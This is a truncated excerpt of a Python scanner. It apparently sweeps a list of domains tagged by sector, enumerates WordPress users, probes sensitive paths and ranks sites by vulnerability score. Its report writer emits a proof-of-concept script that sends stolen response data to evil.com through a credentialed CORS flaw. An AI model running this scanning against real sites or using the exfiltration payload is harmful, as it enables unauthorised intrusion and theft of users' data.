...
def test_target(domain, sector, company=""):
    ...
    if users:
        score += 2
        findings.append(f"wp_users_{len(users)}")
    ...
    for path, keywords in sensitive_paths.items():
        ...
        if len(body_text) < 20:
            continue
        if "<html" in body_text[:100].lower() or "<script" in body_text[:100].lower():
            continue
        ...
        with open(f"{OUTPUT_DIR}/{domain}_findings.md", "w") as f:
            ...
            if is_wp:
                ...
                if "cors_credentialed" in findings:
                    ...
                    f.write(
                        "  .then(r=>r.text()).then(d=>location='https://evil.com/?d='+btoa(d))\n</script>\n```\n\n"
                    )
...
def main():
        ...
        for line in f:
            ...
            if line and not line.startswith("#"):
                ...
                targets.append(
                    (
                        p[0].strip(),
                        p[-1].strip() if len(p) > 2 else "Unknown",
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        ...
        for f in concurrent.futures.as_completed(fut):
            try:
                ...
                if r.get("score", 0) > 0:
                    print(
                        f"  [{r['severity']:>8}] {r['domain']:45s} | {r['score']:2d} | {', '.join(r['findings'])}"
                    )
    ...
    if vuln:
        ...
        for r in sorted(vuln, key=lambda x: -x["score"]):
            print(
                f"  [{r['severity']:>7}] {r['domain']:45s} | {r['sector']:20s} | {r['score']}pts | {', '.join(r['findings'])}"
            )
        ...
        json.dump(
            {
                "total": len(results),
                "vulnerable": len(vuln),
                "results": [r for r in results if isinstance(r, dict) and r.get("score", 0) > 0],
            },
            f,
            indent=2,
        )
